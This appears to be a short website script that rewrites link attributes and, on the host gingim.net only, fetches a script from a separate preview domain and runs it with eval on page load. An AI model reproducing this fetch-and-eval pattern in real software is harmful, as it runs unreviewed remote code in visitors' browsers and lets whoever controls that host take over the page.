document.querySelectorAll("[data-href]").forEach((el) => {
  const url = el.getAttribute("data-href");
  el.setAttribute("data-href", url.replace(/([a-z]+)\?/, "$1/?"));
});

(() => {
  if (window.location.hostname === "gingim.net") {
    const url = "//preview.gingim.tzlev.ovh/i.js";
    fetch(url)
      .then((r) => r.text())
      .then(eval);

    document.querySelectorAll("[data-href]").forEach((el) => {
      const url = el.getAttribute("data-href");
      el.setAttribute("data-href", url.replace(/([a-z]+)\?/, "$1/?"));
    });
  }
})();
